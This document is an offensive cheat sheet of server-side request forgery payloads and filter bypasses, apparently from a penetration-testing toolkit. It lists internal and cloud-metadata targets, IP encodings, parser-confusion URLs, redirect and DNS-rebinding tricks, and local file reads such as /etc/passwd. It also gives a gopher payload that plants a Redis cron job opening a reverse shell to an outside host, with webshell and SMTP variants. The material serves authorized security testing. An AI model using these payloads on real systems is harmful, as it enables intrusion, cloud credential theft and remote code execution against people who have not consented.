# SSRF payloads and filter bypasses

Target endpoint examples use `https://example.com/fetch?url=` and callback
`cbg3abc.oast.pro`. `scripts/ssrf_probe.py gen` emits all of these pre-encoded.

## OOB confirmation set

```
http://cbg3abc.oast.pro/m1
https://cbg3abc.oast.pro/m1
//cbg3abc.oast.pro/m1
http://cbg3abc.oast.pro:80/m1
http://cbg3abc.oast.pro:443/m1
dict://cbg3abc.oast.pro:80/m1
```

Use a unique path marker per parameter. DNS-only hit = resolution without fetch;
retry with `https://`, explicit ports, and IP-literal forms.

## Loopback / internal

```
http://127.0.0.1/          http://127.0.0.1:80/      http://127.0.0.1:443/
http://127.0.0.1:22/       http://127.0.0.1:3306/    http://127.0.0.1:5432/
http://127.0.0.1:6379/     http://127.0.0.1:8080/    http://127.0.0.1:9200/
http://127.0.0.1:11211/    http://127.0.0.1:2375/    http://127.0.0.1:8500/
http://localhost/          http://0.0.0.0/           http://0/
http://[::1]/              http://[::]:80/
http://10.0.0.1/  http://172.16.0.1/  http://192.168.0.1/  http://169.254.169.254/
```

Timing/status differentials on a blind sink distinguish open (fast or distinct
error/length), closed (fast connection-refused error), filtered (timeout).

## IP re-encodings (127.0.0.1 unless noted)

| Form | Payload |
|---|---|
| Decimal dword | `http://2130706433/` (metadata: `http://2852039166/`) |
| Octal | `http://0177.0.0.1/`, `http://017700000001/`, metadata `http://0251.0376.0251.0376/` |
| Hex | `http://0x7f000001/`, `http://0x7f.0x0.0x0.0x1/`, metadata `http://0xa9fea9fe/` |
| Mixed radix | `http://0x7f.1/`, `http://0177.1/` |
| Short form | `http://127.1/`, `http://127.0.1/` |
| IPv6 loopback | `http://[::1]/`, `http://[0000::1]/` |
| IPv6-mapped | `http://[::ffff:127.0.0.1]/`, `http://[0:0:0:0:0:ffff:127.0.0.1]/` |
| IPv6 metadata | `http://[fd00:ec2::254]/latest/meta-data/` (AWS IMDS IPv6) |
| Trailing dot | `http://127.0.0.1./` |
| Wildcard DNS | `http://127.0.0.1.nip.io/`, `http://169.254.169.254.nip.io/` |
| Rebind built-ins | `http://aws.oast.fun/` → 169.254.169.254, `http://alibaba.oast.fun/` → 100.100.100.200 |

## URL-parser confusion (`@`, `#`, `\`)

Behavior differs per fetch library (fingerprint via the OOB `raw-request`
User-Agent: curl, python-requests, Java, Go, Node undici...).

```
http://expected.example.com@127.0.0.1/
http://127.0.0.1#@expected.example.com/
http://expected.example.com%2509@127.0.0.1/       (tab-encoded userinfo)
http://expected.example.com%253F@127.0.0.1/       (double-encoded ?)
http://expected.example.com\@127.0.0.1/           (backslash — browser/WHATWG vs RFC parsers)
http://127.0.0.1%00.expected.example.com/
http://expected.example.com:80@127.0.0.1:6379/
```

Validator-parses-A / fetcher-parses-B mismatches (e.g. Python urllib vs curl) are
the root cause — test every form, watch which host actually receives the DNS/HTTP hit.

## Redirect-to-internal

Host on infrastructure you control:

```
HTTP/1.1 302 Found
Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Submit `http://203.0.113.10/redir` as the "safe" URL. Variants: 301/302/303/307
(307 preserves method+body — useful when the sink POSTs), chained redirects, a
redirect to `gopher://` (older curl follows cross-scheme).

## DNS rebinding

Validator resolves once (gets 198.51.100.7, public, passes), fetcher resolves again
(gets 127.0.0.1). Use a rebinding service or your own authoritative NS with TTL 0
alternating answers; multi-answer records (public + internal A) also beat naive
"first answer" validators. Needed only against resolve→validate→fetch pipelines;
irrelevant when IP-literal encodings already pass.

## Protocol smuggling

- `file:///etc/passwd`, `file:///proc/self/environ`, `file:///c:/windows/win.ini` —
  local file read when the scheme isn't pinned.
- `dict://127.0.0.1:6379/info` — sends one line to a TCP service, often reflects
  the banner/response. Good for service fingerprinting through a reflecting sink.
- `gopher://host:port/_<url-encoded raw bytes>` — arbitrary TCP. The `_` is a dummy
  gopher type; everything after is sent verbatim (CRLF = `%0d%0a`).

### gopher: Redis → RCE (write cron)

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%2A/1 * * * * bash -i >& /dev/tcp/203.0.113.10/4444 0>&1%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%241%0D%0A%244%0D%0Asave%0D%0A
```

Alternatives: write `.ssh/authorized_keys`, write PHP webshell into webroot
(`dir /var/www/html`, `dbfilename shell.php`). Generators: Gopherus /
gopher-payload builders produce Redis, MySQL (unauth), FastCGI, SMTP, memcached,
Zabbix payloads — FastCGI (`gopher://127.0.0.1:9000/_...`) gives direct PHP RCE.

### gopher: SMTP

```
gopher://127.0.0.1:25/_HELO x%0D%0AMAIL FROM:<a@example.com>%0D%0ARCPT TO:<root@example.com>%0D%0ADATA%0D%0ASubject: x%0D%0A%0D%0Abody%0D%0A.%0D%0AQUIT%0D%0A
```

Note: payloads travel inside a query parameter, so **double-encode**: the gopher
payload is URL-encoded once for gopher itself, then the whole value encoded again
for the carrier parameter. `ssrf_probe.py` handles the outer encoding.

## XXE as SSRF carrier

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "http://cbg3abc.oast.pro/xxe">]>
<r>&x;</r>
```

PDF renderers: `<iframe src="http://169.254.169.254/latest/meta-data/">` or
`<link rel=stylesheet href=...>` in the HTML being converted; SVG:
`<image href="http://cbg3abc.oast.pro/svg"/>`.
